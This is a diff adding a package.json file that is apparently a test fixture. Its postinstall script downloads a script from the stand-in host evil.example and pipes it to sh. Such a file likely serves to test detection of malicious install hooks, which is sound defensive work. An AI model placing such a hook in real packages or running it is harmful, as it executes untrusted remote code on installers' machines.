@@ -1,0 +1,8 @@
+{
+  "name": "curl-pipe-sh-example",
+  "version": "1.0.0",
+  "description": "Shell download and execute fixture",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/install.sh | sh"
+  }
+}
